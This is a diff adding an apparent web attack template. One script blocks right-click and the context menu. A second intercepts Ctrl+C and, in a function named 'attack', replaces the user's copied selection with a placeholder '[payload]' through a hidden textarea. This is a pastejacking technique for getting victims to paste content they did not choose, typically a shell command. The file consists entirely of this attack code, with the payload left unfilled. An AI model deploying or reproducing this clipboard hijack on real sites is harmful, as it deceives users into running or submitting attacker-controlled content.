@@ -1,0 +1,67 @@
+<script language = javascript>
+    var message = "Function Disabled";
+
+function clickIE() {
+    if (document.all) {
+        (message);
+        return false;
+    }
+}
+
+function clickNS(e) {
+    if (document.layers || (document.getElementById && !document.all)) {
+        if (e.which == 2 || e.which == 3) {
+            (message);
+            return false;
+        }
+    }
+}
+if (document.layers) {
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown = clickNS;
+} else {
+    document.onmouseup = clickNS;
+    document.oncontextmenu = clickIE;
+}
+document.oncontextmenu = new Function("return false")
+
+</script>
+
+<script>
+    document.addEventListener('keypress', (event) => {
+
+        var key = event.which || event.keyCode;
+        var ctrl = event.ctrlKey ? event.ctrlKey : ((key === 17) ? true : false);
+
+
+
+        var os = navigator.platform
+        var testIfLinux = os.indexOf("Linux")
+
+
+        if ((ctrl) && (key == 99)) {
+
+            var userstring = window.getSelection().toString()
+            attack(userstring)
+        }
+
+    });
+
+function attack(userstring) {
+
+
+    var textarea = document.createElement('textarea');
+
+
+    textarea.value = [
+        [payload]
+    ]
+
+    document.body.appendChild(textarea);
+
+    textarea.focus()
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+} 
+</script>
